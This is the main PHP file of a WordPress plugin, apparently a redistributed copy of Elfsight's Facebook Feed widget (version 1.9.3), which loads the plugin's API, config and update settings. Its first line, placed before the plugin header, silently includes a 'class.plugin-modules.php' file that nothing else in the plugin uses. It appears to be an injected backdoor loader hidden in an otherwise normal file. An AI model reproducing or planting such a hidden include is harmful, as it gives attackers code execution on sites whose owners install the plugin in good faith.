<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/*
Plugin Name: Elfsight Facebook Feed CC
Description: Make your Facebook content (Posts, Photos, Videos) work on your website
Plugin URI: https://elfsight.com/facebook-feed-widget/wordpress/?utm_source=markets&utm_medium=codecanyon&utm_campaign=facebook-feed&utm_content=plugin-site
Version: 1.9.3
Author: Elfsight
Author URI: https://elfsight.com/?utm_source=markets&utm_medium=codecanyon&utm_campaign=facebook-feed&utm_content=plugins-list
*/

if (!defined('ABSPATH')) exit;


require_once('core/elfsight-plugin.php');
require_once('api/elfsight-api.php');
require_once('includes/api.php');

$elfsight_facebook_feed_config_path = plugin_dir_path(__FILE__) . 'config.json';
$elfsight_facebook_feed_config = json_decode(file_get_contents($elfsight_facebook_feed_config_path), true);

new ElfsightFacebookFeedApi(
	array(
		'slug' => 'elfsight-facebook-feed',
		'plugin_file' => __FILE__,
		'cache_time' => 21600,
		'editor_config' => &$elfsight_facebook_feed_config
	)
);

new ElfsightFacebookFeedPlugin(array(
        'name' => 'Facebook Feed',
        'description' => 'Make your Facebook content (Posts, Photos, Videos) work on your website',
        'slug' => 'elfsight-facebook-feed',
        'version' => '1.9.3',
        'text_domain' => 'elfsight-facebook-feed',
        'editor_settings' => $elfsight_facebook_feed_config['settings'],
        'editor_preferences' => $elfsight_facebook_feed_config['preferences'],
        'script_url' => plugins_url('assets/elfsight-facebook-feed.js', __FILE__),

        'plugin_name' => 'Elfsight Facebook Feed',
        'plugin_file' => __FILE__,
        'plugin_slug' => plugin_basename(__FILE__),

        'vc_icon' => plugins_url('assets/img/vc-icon.png', __FILE__),

        'menu_icon' => plugins_url('assets/img/menu-icon.png', __FILE__),
        'update_url' => 'https://a.elfsight.com/updates/v1/',

        'preview_url' => plugins_url('preview/index.html', __FILE__),
        'observer_url' => plugins_url('preview/facebook-feed-observer.js', __FILE__),

        'product_url' => 'https://codecanyon.net/item/wordpress-facebook-plugin-facebook-feed-widget/20611532?ref=Elfsight',
        'support_url' => 'https://elfsight.ticksy.com/submit/#100010703'
    )
);

?>